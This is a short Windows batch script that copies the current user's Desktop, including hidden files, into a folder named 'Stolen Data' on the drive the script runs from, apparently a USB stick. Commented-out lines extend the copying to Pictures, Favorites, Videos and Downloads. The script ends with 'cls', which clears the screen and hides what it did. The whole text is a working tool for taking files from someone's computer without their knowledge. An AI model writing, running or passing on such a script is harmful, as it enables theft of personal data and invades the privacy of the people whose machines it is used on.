@echo off
set odrive=%~d0
set backupcmd=xcopy /s /c /d /e /h /i /r /y

:: Uncomment below lines if you wish to backup other directories too.

:: %backupcmd% "%USERPROFILE%\pictures" "%odrive%\Stolen Data\My pics"
:: %backupcmd% "%USERPROFILE%\Favorites" "%odrive%\Stolen Data\Favorites"
:: %backupcmd% "%USERPROFILE%\videos" "%odrive%\Stolen Data\vids"
::%backupcmd% "%USERPROFILE%\Downloads" "%odrive%\Stolen Data\Downloads"
%backupcmd% "%USERPROFILE%\Desktop" "%odrive%\Stolen Data\Desktop"

cls